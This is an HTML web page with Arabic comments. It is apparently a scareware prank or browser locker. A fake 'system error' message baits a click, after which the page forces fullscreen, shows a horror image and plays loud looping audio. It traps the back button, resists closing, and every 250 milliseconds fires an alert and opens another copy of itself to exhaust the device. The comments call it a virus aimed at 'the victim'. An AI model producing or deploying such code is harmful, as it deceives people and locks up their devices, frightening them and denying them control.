<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CRITICAL_SYSTEM_LOCKED</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; cursor: none; }
        #horrorImg { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; object-fit: cover; z-index: 9999; display: none; }
        #msg { color: #f00; text-align: center; padding-top: 45vh; font-family: monospace; font-size: 20px; text-transform: uppercase; }
    </style>
</head>
<body onclick="startInfection()">

    <div id="msg">⚠️ SYSTEM ERROR: CLICK TO FIX CORE ⚠️</div>
    <img id="horrorImg" src="https://i.ibb.co/39snnynW/1000016067.jpg">
    <audio id="sfx" src="tfy-krk.mp3" preload="auto" loop></audio>

    <script>
        let active = false;

        // ميزة القفل الحديدي: منع زر الرجوع سواسوة
        history.pushState(null, null, location.href);
        window.onpopstate = function() {
            history.go(1);
        };

        // منع إغلاق التبويب أو المسح من الخلفية
        window.onbeforeunload = function() { return "FATAL_ERROR"; };

        // إذا خرج ورجع، الفيروس يعاود يطرطق سواسوة
        document.addEventListener("visibilitychange", function() {
            if (document.visibilityState === 'visible' && active) {
                forceLock();
            }
        });

        function startInfection() {
            if (active) return;
            active = true;
            document.getElementById('msg').style.display = 'none';
            forceLock();
        }

        function forceLock() {
            // إجبار وضع ملء الشاشة
            document.documentElement.requestFullscreen().catch(() => {});
            document.getElementById('horrorImg').style.display = 'block';
            
            let audio = document.getElementById('sfx');
            audio.volume = 1.0; // أقصى قوة للصوت الصاخب
            audio.play();
            
            // اللاق القاتل: تنبيهات لا تنتهي تمنع التحكم في الهاتف سواسوة
            setInterval(() => {
                alert("⚠️ طفي كراك.. النظام مات سواسوة!");
                
                // فتح نوافذ جديدة لملء الذاكرة ومنع المسح من الخلفية
                window.open(window.location.href, '_blank');
                
                // إعادة تشغيل الصوت بالقوة إذا حاول الضحية كتمه
                if(audio.paused) audio.play();
                audio.volume = 1.0;
            }, 250);
        }
    </script>
</body>
</html>
